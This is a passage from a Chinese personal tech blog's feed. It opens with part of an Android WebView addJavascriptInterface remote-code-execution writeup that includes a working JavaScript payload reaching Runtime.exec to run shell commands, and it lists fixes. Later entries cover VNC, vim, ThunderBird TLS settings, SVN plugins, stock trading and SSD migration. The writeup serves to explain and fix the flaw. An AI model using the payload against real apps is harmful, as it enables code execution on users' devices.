class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">cmd</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">jsinterface</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getMethod</span>(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).<span class="title function_">invoke</span>(<span class="literal">null</span>,<span class="literal">null</span>).<span class="title function_">exec</span>(cmd);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">execute</span>([<span class="string">&#x27;/system/bin/sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;echo \&quot;mwr\&quot; &gt; /mnt/sdcard/mwr.txt&#x27;</span>]);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   jsinterface是导出的Java对象， 测试成功，权限是app 的用户权限。</p><h2 id="☆-修复方法和现状"><a href="#☆-修复方法和现状" class="headerlink" title="☆ 修复方法和现状"></a>☆ 修复方法和现状</h2><p>   Google宣布不为小于Android 4.4 的系统提供WebView补丁, 具体可以参见链接：</p><p><a href="https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior">https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior</a></p><p>   要解决WebView的RCE漏洞，比较靠谱的方法是升级Android系统，至少要升级到<br>   API level 17 (Android 4.2), WebView 除了最严重的RCE漏洞，还有各种SOP漏洞，所<br>   以至少要升级到Android 4.4才能保证安全，小于Android 4.4 Google不提供补丁。<br>   Android 4.4 以后使用以chrome为基础的WebView。</p><p>   升级系统API level 17后，只有显示添加 @JavascriptInterface的方法才能被JavaScript<br>   调用，这样反射就失去作用了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibility&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibilityTraversal&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;searchBoxJavaBridge_&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="☆-参考链接"><a href="#☆-参考链接" class="headerlink" title="☆ 参考链接"></a>☆ 参考链接</h2><ul><li><a href="http://developer.android.com/guide/webapps/webview.html">http://developer.android.com/guide/webapps/webview.html</a></li><li><a href="http://developer.android.com/reference/android/webkit/WebView.html">http://developer.android.com/reference/android/webkit/WebView.html</a></li><li><a href="https://daoyuan14.github.io/news/newattackvector.html">https://daoyuan14.github.io/news/newattackvector.html</a></li><li><a href="http://droidsploit.baidu.com/view/14100201.html">http://droidsploit.baidu.com/view/14100201.html</a></li><li><a href="http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html">http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html</a></li><li><a href="http://tutorials.jenkov.com/java-reflection/index.html">http://tutorials.jenkov.com/java-reflection/index.html</a></li><li><a href="http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html">http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html</a></li><li><a href="http://www.programcreek.com/2013/09/java-reflection-tutorial/">http://www.programcreek.com/2013/09/java-reflection-tutorial/</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/">https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/</a></li><li><a href="https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/">https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/</a></li></ul><h2 id="☆-思考"><a href="#☆-思考" class="headerlink" title="☆ 思考"></a>☆ 思考</h2><p>   WebView 中还提供了一个方法让我们可以获得控制的机会</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.substring(<span class="number">0</span>,<span class="number">6</span>).equalsIgnoreCase(<span class="string">&quot;yourscheme:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// parse the URL object and execute functions</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   如果使用上面的代码，在网页的javascript中添加下面的代码，就可以进入后面的解析<br>   URL流程，如果后续代码没有进行严格的检查可能会有一些其他的安全问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="attr">yourscheme</span>:<span class="comment">//method?parameter=value</span></span><br></pre></td></tr></table></figure><p>Google对这个方法的解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give the host application a chance to take over the control when a new url </span><br><span class="line">is about to be loaded in the current WebView. If WebViewClient is not </span><br><span class="line">provided, by default WebView will ask Activity Manager to choose the proper </span><br><span class="line">handler for the url. If WebViewClient is provided, return true means the </span><br><span class="line">host application handles the url, while return false means the current </span><br><span class="line">WebView handles the url. This method is not called for requests using </span><br><span class="line">the POST &quot;method&quot;.</span><br></pre></td></tr></table></figure><p>其实就是当WebView加载新的URL时给App程序一个控制的机会，这还是有一些想象空间的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;☆-来自-developer-android-com-的信息&quot;&gt;&lt;a href=&quot;#☆-来自-developer-android-com-的信息&quot; class=&quot;headerlink&quot; title=&quot;☆ 来自 developer.android.com 的信息&quot;&gt;</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Fedora 安装 vnc server</title>
    <link href="http://usmacd.com/cn/vnc/"/>
    <id>http://usmacd.com/cn/vnc/</id>
    <published>2023-09-06T03:00:51.882Z</published>
    <updated>2023-09-06T03:00:51.882Z</updated>
    
    <content type="html"><![CDATA[<p>因为疫情，现在公司启用远程办公了，不得已在工作机上开了vncserver，这篇文档做个记录。</p><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="(1) 安装"></a>(1) 安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install tigervnc-server</span><br></pre></td></tr></table></figure><h2 id="2-创建服务"><a href="#2-创建服务" class="headerlink" title="(2) 创建服务"></a>(2) 创建服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@.service</span><br></pre></td></tr></table></figure><p>编辑 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;vncserver@.service 替换下面两行的USER为实际用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ExecStart=/sbin/runuser -l USER -c &quot;/usr/bin/vncserver %i -geometry 1280x1024&quot;</span><br><span class="line">PIDFile=/home/USER/.vnc/%H%i.pid</span><br></pre></td></tr></table></figure><p>执行命令 <code>systemctl daemon-reload</code></p><p>使用vpnpasswd修改密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~]<span class="comment"># su - USER</span></span><br><span class="line">~]$ vncpasswd</span><br><span class="line">Password:</span><br><span class="line">Verify:</span><br></pre></td></tr></table></figure><p>启动vncserver的命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start vncserver@:1</span><br></pre></td></tr></table></figure><p>参考文档：</p><p><a href="https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html">https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html</a></p><h2 id="3-直接调用命令行"><a href="#3-直接调用命令行" class="headerlink" title="(3)直接调用命令行"></a>(3)直接调用命令行</h2><p>使用上面的方法过于繁琐，可以直接调用 vncserver 的命令行</p><p><code>vncserver :2 -geometry 1920x1080 -depth 24</code></p><h2 id="4-改变vnc的默认桌面"><a href="#4-改变vnc的默认桌面" class="headerlink" title="(4) 改变vnc的默认桌面"></a>(4) 改变vnc的默认桌面</h2><p>vim ~&#x2F;.vnc&#x2F;xstartup</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> SESSION_MANAGER</span><br><span class="line"><span class="built_in">unset</span> DBUS_SESSION_BUS_ADDRESS</span><br><span class="line"><span class="comment">#exec /etc/X11/xinit/xinitrc</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /bin/sh /etc/xdg/xfce4/xinitrc</span><br></pre></td></tr></table></figure><p>必须改变默认桌面，要不可能登录不进去。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>个人觉得从安全角度看，使用命令启用 vncserver 是比较合理的，要用了就打开，用完就关。另外vncserver 连接加了一层 tunnel，安全无小事。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为疫情，现在公司启用远程办公了，不得已在工作机上开了vncserver，这篇文档做个记录。&lt;/p&gt;
&lt;h2 id=&quot;1-安装&quot;&gt;&lt;a href=&quot;#1-安装&quot; class=&quot;headerlink&quot; title=&quot;(1) 安装&quot;&gt;&lt;/a&gt;(1) 安装&lt;/h2&gt;&lt;figure</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>vim 输入特殊字符</title>
    <link href="http://usmacd.com/cn/vim_special_char/"/>
    <id>http://usmacd.com/cn/vim_special_char/</id>
    <published>2023-09-06T03:00:51.880Z</published>
    <updated>2023-09-06T03:00:51.880Z</updated>
    
    <content type="html"><![CDATA[<p>vim 的编辑能力确实很强，今天说一下如何在vim中输入特殊字符，比如音标、unicode 字符。</p><p><a href="http://vimhelp.appspot.com/digraph.txt.html">http://vimhelp.appspot.com/digraph.txt.html</a><br><a href="http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit">http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit</a></p><p>关键就在上面两篇，可能许多人不喜欢看复杂的文章，我这里简单介绍一下用法。</p><p>输入音标 ə</p><p>i 进入编辑模式    CTRL-vu0259<br>那如何知道 ə 的 unicode hex number 是 0259呢，在vim的normal 模式下，将光标移动到ə输入ga</p><p>输入 ⇒</p><p>i 进入编辑模式   CTRL-k&#x3D;&gt;<br>:dig 可以看到支持这种方法输入的unicode 字符</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vim 的编辑能力确实很强，今天说一下如何在vim中输入特殊字符，比如音标、unicode 字符。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://vimhelp.appspot.com/digraph.txt.html&quot;&gt;http://vimhelp.appspot.com</summary>
      
    
    
    
    
    <category term="vim" scheme="http://usmacd.com/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>ThunerBird 78.8.1 连接 TLS 1.0 失败问题和 Linux 乱谈</title>
    <link href="http://usmacd.com/cn/thunderbird.tls.1.0/"/>
    <id>http://usmacd.com/cn/thunderbird.tls.1.0/</id>
    <published>2023-09-06T03:00:51.814Z</published>
    <updated>2023-09-06T03:00:51.814Z</updated>
    
    <content type="html"><![CDATA[<p>我在公司使用 Linux 作用主力机已经 10 多年了，自从抛弃 Ubuntu 转入 Fedora 怀抱，生活幸福了不少。<br>早年最大的问题是 OFFICE 软件，工作中少不了要和 doc、ppx，xls 打交道，又没有太好的软件可以使用。<br>刚开始基本就两个解决方案，wine office 和永中 OFFICE，这两个方案都不是太理想，wine 的速度很慢，<br>永中则兼容性比较差，还会出现文档格式看起来就有明显差异的情况。。</p><p>随着金山 wps 的发展，现在 OFFICE 的问题基本解决，作为轻度 EXCEL 使用者基本已经满足需求了。Linux<br>现在主要问题是字体渲染比较差，中文经常看起来发虚，如果能把这个问题彻底解决就非常不错了。作为Linux<br>老用户，各种魔改后，也能较好使用了，但后面发现还是换个显示器更管用。要解决中文显示问题，有两个<br>字体很管用，文泉驿微米黒和微软雅黑，实践证明把系统字体用上面两个字体替换，显示效果也就好了不少了。</p><p>Ubuntu Linux 最大的问题就是不太稳定，基本每次大版本升级显示都要挂，弄得我都有点心理阴影了，原来<br>周围还挺多同学使用 Linux，最终放弃了，一个直接用 Windows 了，还有一个 Windows 上跑一个 Linux 虚拟机。<br>Ubuntu 还有个坏习惯喜欢乱改，upstart，Unity等，后面都没有成为主流，bug 就更不用说了，经常挺闹心的。</p><p>Fedora 从近些年的使用情况来看，还是很不错的，网络中流传是 Redhat Linux Enterprise 的小白版本，<br>但是其实只要 bug 修得快，你大概率是感觉不到的。遇上问题，放狗一搜就会发现 redhat 已经有 bug 在<br>处理中了，于是乎就有了今天这篇。</p><p>在升级到 Fedara 33 和 ThunderBird 78 后，使用 TLS 连接公司的 ExChange 邮件服务器就连不上了。<br>我们公司的内网安全审核非常严格，邮件不使用加密连接要限时整改。放狗一搜发现，大批人员都遇上了<br>相同的问题，也有人给出了解决方案。</p><p><a href="https://support.mozilla.org/en-US/questions/1295861">https://support.mozilla.org/en-US/questions/1295861</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I think this could be due to the minimum version of TLS supported by TB 78. The release notes state </span><br><span class="line">that versions lower than 1.2 are disabled, so if your server only supports v. 1.1, </span><br><span class="line">you might be able to fix sending by changing the preference security.tls.version.min to 2 from the default 3, in Config. editor.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.thunderbird.net/en-US/thunderbird/78.0/releasenotes/">https://www.thunderbird.net/en-US/thunderbird/78.0/releasenotes/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TLS 1.0 and 1.1 disabled</span><br></pre></td></tr></table></figure><p>如何开启 TLS 1.0， mozilla 也给出了相应的方案</p><p><a href="https://support.mozilla.org/en-US/kb/thunderbird-78-faq#w_how-to-enable-outdated-security-protocols-tls-1-0-and-1-1">https://support.mozilla.org/en-US/kb/thunderbird-78-faq#w_how-to-enable-outdated-security-protocols-tls-1-0-and-1-1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">How to enable outdated security protocols TLS 1.0 and 1.1</span><br><span class="line"></span><br><span class="line">Open Config Editor (about:config)</span><br><span class="line">≡ &gt; Preferences &gt; Find in Preferences</span><br><span class="line">In the searchbox, type: about:config, then press Enter.</span><br><span class="line">Click on the button Config Editor… in the search result.</span><br><span class="line">In the about:config dialog, search for: security.tls.version.min</span><br><span class="line">Double-click on the found preference security.tls.version.min and change its value to 1, then press Enter.</span><br><span class="line">Restart Thunderbird and try to download your messages.</span><br><span class="line">If you can receive and/or send your messages after changing this preference:</span><br><span class="line"></span><br><span class="line">Please inform your email provider to upgrade the security protocols on the server to support TLS 1.2.</span><br><span class="line">Revert the preference security.tls.version.min to its original value as soon as possible by repeating </span><br><span class="line">the above procedure, then right-click on the preference and choose Reset from the context menu.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看上去解决方案很简单，在 Preferences 中的搜索框里输入 <code>about:config</code> 点击进入，将其中的<br><code>security.tls.version.min</code> 设置为 1 就好了，但是在 Fedora 34 中不起作用。我用 wireshark 抓了包看，<br>ThunderBird 自己报告不支持的协议版本。我仔细研究了一下 ThunderBird 相关的 config 项有下面几个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">security.tls.version.min</span><br><span class="line">security.tls.version.enable-deprecated</span><br><span class="line">security.tls.version.fallback-limit</span><br></pre></td></tr></table></figure><p>我把这几个选项都设置了一下，分别设置为 1 true 1，还是不管用。</p><p>在 Fedora 33 上这个问题就没解决，这都 Fedora 34 了，所以又花了时间研究了一下。没好办法，放狗，运气<br>不错，看到了这篇</p><p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1674092#c11">https://bugzilla.mozilla.org/show_bug.cgi?id=1674092#c11</a></p><p>原来 Fedora 还有个 <code>StrongCryptoSettings</code> ，看文档可以修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update-crypto-policies --set DEFAULT:FEDORA32</span><br><span class="line">update-crypto-policies --set LEGACY</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>关键的内容就是下面这几行</p><p>cat &#x2F;etc&#x2F;crypto-policies&#x2F;state&#x2F;CURRENT.pol</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min_tls_version = TLS1.2</span><br><span class="line">protocol = TLS1.3 TLS1.2 DTLS1.2</span><br></pre></td></tr></table></figure><p>执行后变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min_tls_version = TLS1.0</span><br><span class="line">protocol = TLS1.3 TLS1.2 TLS1.1 TLS1.0 DTLS1.2 DTLS1.0</span><br></pre></td></tr></table></figure><p>重启系统后，又可以开心地使用 ThunderBird 了 ^_^</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我在公司使用 Linux 作用主力机已经 10 多年了，自从抛弃 Ubuntu 转入 Fedora 怀抱，生活幸福了不少。&lt;br&gt;早年最大的问题是 OFFICE 软件，工作中少不了要和 doc、ppx，xls 打交道，又没有太好的软件可以使用。&lt;br&gt;刚开始基本就两个解决方</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>VIM + SVN 管理</title>
    <link href="http://usmacd.com/cn/svn_vim/"/>
    <id>http://usmacd.com/cn/svn_vim/</id>
    <published>2023-09-06T03:00:51.812Z</published>
    <updated>2023-09-06T03:00:51.812Z</updated>
    
    <content type="html"><![CDATA[<p>公司使用svn管理源代码，避免不了要和svn打交道，有几个比较好的解决方案。</p><h2 id="1-vcscommand-vim"><a href="#1-vcscommand-vim" class="headerlink" title="1. vcscommand.vim"></a>1. vcscommand.vim</h2><p><a href="http://www.vim.org/scripts/script.php?script_id=90">http://www.vim.org/scripts/script.php?script_id=90</a></p><p>这个插件的特点是支持的版本管理工具多,支持git，svn等常见版本管理工具。<br>vcscommand.vim插件默认绑定了无差别的快捷键，使用起来非常方便。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">|&lt;Leader&gt;|ca VCSAdd</span><br><span class="line">|&lt;Leader&gt;|cn VCSAnnotate</span><br><span class="line">|&lt;Leader&gt;|cN VCSAnnotate!</span><br><span class="line">|&lt;Leader&gt;|cc VCSCommit</span><br><span class="line">|&lt;Leader&gt;|cD VCSDelete</span><br><span class="line">|&lt;Leader&gt;|cd VCSDiff</span><br><span class="line">|&lt;Leader&gt;|cg VCSGotoOriginal</span><br><span class="line">|&lt;Leader&gt;|cG VCSGotoOriginal!</span><br><span class="line">|&lt;Leader&gt;|ci VCSInfo</span><br><span class="line">|&lt;Leader&gt;|cl VCSLog</span><br><span class="line">|&lt;Leader&gt;|cL VCSLock</span><br><span class="line">|&lt;Leader&gt;|cr VCSReview</span><br><span class="line">|&lt;Leader&gt;|cs VCSStatus</span><br><span class="line">|&lt;Leader&gt;|cu VCSUpdate</span><br><span class="line">|&lt;Leader&gt;|cU VCSUnlock</span><br><span class="line">|&lt;Leader&gt;|cv VCSVimDiff</span><br></pre></td></tr></table></figure><p>这个 <code>&lt;Leader&gt;</code> 得看你定义了什么快捷键，vim 默认的是 <code>\</code></p><h2 id="2-vim-unite-svn"><a href="#2-vim-unite-svn" class="headerlink" title="2.  vim-unite-svn"></a>2.  vim-unite-svn</h2><p>小日本写的unite.vim的svn插件，unite.vim 是一个非常不错的vim插件，<br>它的作用是 为vim 写简单界面，要使用vim-unite-svn首先需要安装unite.vim 插件，<br>折腾这个插件的原因是vcscommand.vim有些不太好的地方。</p><ul><li>buffer管理的不太好</li><li>status 比较弱</li><li>羡慕emacs的vc mode的体验</li></ul><p><a href="https://github.com/Shougo/unite.vim">https://github.com/Shougo/unite.vim</a></p><p>小日本写的 <code>vim-unite-svn</code> 插件太久没有更新了，有一些bug，我修改了一下，用了<br>一段时间暂时没有发现什么问题。</p><p><a href="https://github.com/henices/vim-unite-svn">https://github.com/henices/vim-unite-svn</a></p><p>支持基本的svn命令， svn status, svn info, svn diff, svn commit, svn up</p><p>使用示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:Unite svn/status</span><br><span class="line">:Unite svn/diff</span><br><span class="line">:Unite svn/blame</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;公司使用svn管理源代码，避免不了要和svn打交道，有几个比较好的解决方案。&lt;/p&gt;
&lt;h2 id=&quot;1-vcscommand-vim&quot;&gt;&lt;a href=&quot;#1-vcscommand-vim&quot; class=&quot;headerlink&quot; title=&quot;1. vcscommand.</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
    <category term="vim" scheme="http://usmacd.com/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>个人炒股经历</title>
    <link href="http://usmacd.com/cn/stock_experience/"/>
    <id>http://usmacd.com/cn/stock_experience/</id>
    <published>2023-09-06T03:00:51.811Z</published>
    <updated>2023-09-06T03:00:51.811Z</updated>
    
    <content type="html"><![CDATA[<p>本人IT男一枚，2015年入市，到今天5年多了，所幸还在吃人不露骨头的市场上活着，也是非常不容易。基本不存在什么特殊情况，韭菜总是在人声鼎沸的牛市高点入场，本人也不例外，上证3500多点入市，上证3800多点让媳妇买了沪深 300 基金 （不是ETF），这基金今年才解套，小赚出局了。</p><p>运气好的是，2015年的时候中了一支新股，新股的收益对冲了倒金字塔加仓的回撤，小赚1万元出局清了仓，有时候我也在想如果不是这赚了1万，是不是也就不会继续炒股了。接下来的事情大家都很熟悉了，熔断和股灾3.0，一直在不赚和小亏中挣扎着，居然也坚持了下来。理工男的特质救了我，从2015年开始认真学习股票操作，恶补基础知识，分时，K线，缺口，价量关系，缠论，波浪理论，箱体理论，趋势交易，价值投资，基本各种理论都看了遍，其实到最后发现有用的东西太少了，关于股票的书也基本没啥用，真正有用的书可能就那么几本，可是如果不看几十本的话，你怎么知道哪几本有用呢？所以炒股并不存在什么捷径，一夜暴富基本是神话，为啥呢？盈亏同源，怎么赚钱就可能怎么亏回去，除非你知道你为什么能赚钱。</p><p>下面是这些年的心得，应该可以涨几年功力吧？</p><p>要在市场上生存你必须具备某种优势，没有这种优势就是纯赌博，真正赚钱的是要做大概率的投机。买卖股票实际上是对股票做分类，哪些可以做，哪些不可以做，这就涉及了股票交易系统，有了交易系统，剩下的就是执行问题了，要做到BDWQ，后面就是仓位计算，根据股票的波动和你愿意承担的风险程度计算出来。</p><p>回首看虽然现在稳定盈利了，又回到了灵魂拷问，投入的时间值得吗？对于很多人来说，最重要可能是资金的原始积累，10万块，翻10倍，100万在中国很多城市一套房也买不了，更不用说财富自由了，所以先努力工作吧，边工作边加大投资比例，梦想还是要有的，万一实现了呢？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本人IT男一枚，2015年入市，到今天5年多了，所幸还在吃人不露骨头的市场上活着，也是非常不容易。基本不存在什么特殊情况，韭菜总是在人声鼎沸的牛市高点入场，本人也不例外，上证3500多点入市，上证3800多点让媳妇买了沪深 300 基金 （不是ETF），这基金今年才解套，小</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>市场情绪指标</title>
    <link href="http://usmacd.com/cn/stock_emotion/"/>
    <id>http://usmacd.com/cn/stock_emotion/</id>
    <published>2023-09-06T03:00:51.809Z</published>
    <updated>2023-09-06T03:00:51.809Z</updated>
    
    <content type="html"><![CDATA[<p>可以量化一下，有时间考虑程序实现。</p><ul><li>涨&#x2F;跌停板数</li><li>涨停封版成功率</li><li>涨跌股票比率</li><li>大盘成交量额</li><li>融资余额情况</li><li>北向资金净流入 （参考）</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可以量化一下，有时间考虑程序实现。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;涨&amp;#x2F;跌停板数&lt;/li&gt;
&lt;li&gt;涨停封版成功率&lt;/li&gt;
&lt;li&gt;涨跌股票比率&lt;/li&gt;
&lt;li&gt;大盘成交量额&lt;/li&gt;
&lt;li&gt;融资余额情况&lt;/li&gt;
&lt;li&gt;北向资金净流入 （参考）&lt;/li&gt;
&lt;/</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>SSD 迁移记</title>
    <link href="http://usmacd.com/cn/ssd/"/>
    <id>http://usmacd.com/cn/ssd/</id>
    <published>2023-09-06T03:00:51.808Z</published>
    <updated>2023-09-06T03:00:51.808Z</updated>
    
    <content type="html"><![CDATA[<p>由于某些需求，决定上SSD，提高一下硬盘读写速度。上二手东买了三星(SAMSUNG) 860 EVO<br>最初的想法是作为数据盘使用，即操作系统还是跑在机械硬盘上，仔细一思考，还是折腾<br>一下，要不实在是有些浪费，事实证明，折腾是值得的，感觉就想飞一样。</p><p>首先查看一下原始的情况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mount</span><br><span class="line"></span><br><span class="line">/dev/sda1 on /boot <span class="built_in">type</span> ext4 (rw,relatime,seclabel,stripe=4)</span><br><span class="line">/dev/mapper/fedora-root on / <span class="built_in">type</span> ext4 (rw,relatime,seclabel)</span><br></pre></td></tr></table></figure><p>当然首先要把SSD处理一下，安装一下 gparted 图形化界面很好用。建个分区表，选择<br>gpt，分个区，&#x2F;dev&#x2F;mapper&#x2F;fedora-root 大小为50G，先分个50G的分区，剩下的全部给<br>另外一个分区，格式化为 ext4。操作完成后，用fdisk 查看一下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ fdisk -l</span><br><span class="line"></span><br><span class="line">Disk /dev/sdb：232.9 GiB，250059350016 字节，488397168 个扇区</span><br><span class="line">单元：扇区 / 1 * 512 = 512 字节</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：gpt</span><br><span class="line">磁盘标识符：</span><br><span class="line"></span><br><span class="line">设备            起点      末尾      扇区   大小 类型</span><br><span class="line">/dev/sdb1       2048 104859647 104857600    50G Linux 文件系统</span><br><span class="line">/dev/sdb2  104859648 488396799 383537152 182.9G Linux 